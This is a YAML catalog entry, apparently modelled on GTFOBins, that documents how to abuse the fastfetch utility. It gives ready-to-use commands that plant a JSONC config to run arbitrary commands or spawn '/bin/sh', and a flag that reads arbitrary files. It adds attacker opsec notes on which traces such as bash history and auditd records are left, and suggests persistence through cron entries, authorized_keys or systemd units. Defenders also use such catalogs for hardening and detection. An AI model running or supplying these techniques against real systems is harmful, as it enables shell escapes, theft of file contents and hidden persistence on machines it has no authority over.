---
name: fastfetch
capabilities:
- exec
- spawn
- read
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: command
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: |-
    echo '{"modules":[{"type":"command","key":"x","text":"exec /path/to/command"}]}' >/path/to/temp-file.jsonc
    fastfetch -c /path/to/temp-file.jsonc
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: fastfetch --file /path/to/input-file
  notes: The file content is used as the logo while some other information is displayed on its right.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo '{"modules":[{"type":"command","key":"x","text":"exec /bin/sh 1>&0 2>&0"}]}' >/path/to/temp-file.jsonc
    fastfetch -c /path/to/temp-file.jsonc
references:
- https://gtfobins.github.io/gtfobins/fastfetch/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
